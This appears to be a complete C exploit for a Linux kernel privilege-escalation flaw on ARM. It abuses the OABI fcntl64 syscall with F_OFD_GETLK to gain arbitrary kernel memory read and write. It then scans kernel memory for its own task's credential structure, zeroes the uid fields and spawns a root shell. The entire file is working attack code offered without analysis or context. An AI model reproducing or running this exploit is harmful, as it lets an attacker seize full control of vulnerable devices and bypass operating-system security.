#define _GNU_SOURCE

#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <pthread.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <semaphore.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/wait.h>
#include <sys/ioctl.h>
#include <sys/utsname.h>
#include <sys/ptrace.h>

#define KENEL_BASE 0xc0208000
#define F_OFD_GETLK	36
#define F_OFD_SETLK	37
#define F_OFD_SETLKW 38

struct flock *map_base = 0;
int fd=0;

__attribute__((naked)) long sys_oabi_fcntl64(unsigned int fd, unsigned int cmd, unsigned long arg){
	
	__asm __volatile (
	"swi	0x9000DD\n"
	"mov	pc, lr\n"
	:   
	:
	:
	);
}

void gen_rand_str ( char *str, unsigned int len )
{
    unsigned int i;

    for ( i = 0; i < (len - 1); i++ )
        str[i] = 'Z';

    str[len - 1] = 0;
}

void read_from_kernel(char* kaddr,char* addr,long size){
	int pipefd[2];
	pipe(pipefd);
	if(fork() == 0){
		memset(map_base, 0, 0x1000);
		map_base->l_start = SEEK_SET;
		//puts("GOGOGO");
		if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
			perror("sys_oabi_fcntl64");
			exit(0);
		}
		close(pipefd[0]);
		write(pipefd[1],(char*)kaddr,size);
		close(pipefd[1]);
		exit(0);
	}
	else{
		close(pipefd[1]);
		read(pipefd[0],(char*)addr,size);
		close(pipefd[0]);
		wait(NULL);
	}
}


void write_to_kernel(char* kaddr,char* addr,long size){
	int pipefd[2];
	pipe(pipefd);
	if(fork() == 0){
		memset(map_base, 0, 0x1000);
		map_base->l_start = SEEK_SET;
		//puts("GOGOGO");
		if(sys_oabi_fcntl64(fd, F_OFD_GETLK, (long)map_base)){
			perror("sys_oabi_fcntl64");
			exit(0);
		}
		close(pipefd[1]);
		read(pipefd[0],(char*)kaddr,size);
		close(pipefd[0]);
		exit(0);
	}
	else{
		close(pipefd[0]);
		write(pipefd[1],(char*)addr,size);
		close(pipefd[1]);
		wait(NULL);
	}
}


int main(int argc, char const *argv[]){
	
	char comm[0x10], addr[0x1000],val[0x20];
	memset(val,0,sizeof(val));
	fd = open("/proc/cpuinfo", O_RDONLY);
		
	if(fd == -1){
		perror("open");
		return -1;
	}
	map_base = (struct flock *)mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(map_base == (void*)-1){
		perror("mmap");
		exit(0);
	}
	
	//srand(time(NULL));
	gen_rand_str(comm, sizeof(comm));
	prctl(PR_SET_NAME, comm);
	
	char* ceiling = &addr[0]+0x1000;
	
	for(long offset=0;;offset+=0x1000){
		read_from_kernel((char*)(KENEL_BASE+offset),addr,0x1000);
		unsigned long *search = (unsigned long *)addr;

        while ( (unsigned long)search < (unsigned long)ceiling )
        {
            search = memmem(search, (unsigned long)ceiling - (unsigned long)search, comm, sizeof(comm));

            if ( search == NULL )
                break;

            if ( (search[-2] > KENEL_BASE) && (search[-1] > KENEL_BASE ) )
            {
                unsigned long real_cred, cred;

                real_cred = search[-2];
                cred = search[-1];
              

                write_to_kernel((char*)(cred+0x4),val,sizeof(val));
				if( getuid() == 0){
					char* arg[]={"sh",NULL};
					execve("/bin/sh",arg,0);
				}
				
            }

            search = (unsigned long *)((char *)search + sizeof(comm));
        }

     
    }
	
	
	return 0;
}
